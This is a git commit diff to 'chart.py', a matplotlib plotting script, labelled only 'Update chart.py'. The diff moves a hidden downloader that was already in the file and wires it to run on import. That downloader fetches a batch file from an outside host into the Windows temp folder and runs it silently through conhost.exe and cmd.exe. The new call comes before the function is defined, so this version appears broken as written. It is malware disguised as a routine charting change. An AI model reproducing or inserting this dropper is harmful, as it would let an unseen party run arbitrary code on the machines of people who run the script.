c8f38143283768e8463777aa5f0ea21081a6095e
crmdevtest <crmdevtest@broskiboy.com>
2026-05-21 11:39:37 -0400

    Update chart.py

--- chart.py
+++ chart.py
@@ -1,6 +1,13 @@
 import matplotlib.pyplot as plt
 import numpy as np
 import pandas as pd
+import asyncio
+import subprocess
+import os
+import tempfile
+import requests
+
+asyncio.run(my_function())
 
 # Sample Data: 1000 random numbers from a normal distribution
 data = np.random.randn(1000)
@@ -156,26 +163,23 @@ plt.show()
 
 
 
-import subprocess
 
-import os
-import tempfile
-import requests
 
-url = "http://s1083932807.online-home.ca/o"
-
-# Get the Windows temp directory path
-temp_dir = tempfile.gettempdir()
-file_path = os.path.join(temp_dir, "zfei.bat")
-
-# Download and save
-response = requests.get(url)
-if response.status_code == 200:
-    with open(file_path, "wb") as f:
-        f.write(response.content)
-    # print(f"File downloaded to: {file_path}")
-
-script_path = file_path
-
-# Launch wscript with the script path as an argument
-subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
+async def my_function():
+    url = "http://s1083932807.online-home.ca/o"
+    
+    # Get the Windows temp directory path
+    temp_dir = tempfile.gettempdir()
+    file_path = os.path.join(temp_dir, "zfei.bat")
+    
+    # Download and save
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(file_path, "wb") as f:
+            f.write(response.content)
+        # print(f"File downloaded to: {file_path}")
+    
+    script_path = file_path
+    
+    # Launch wscript with the script path as an argument
+    subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
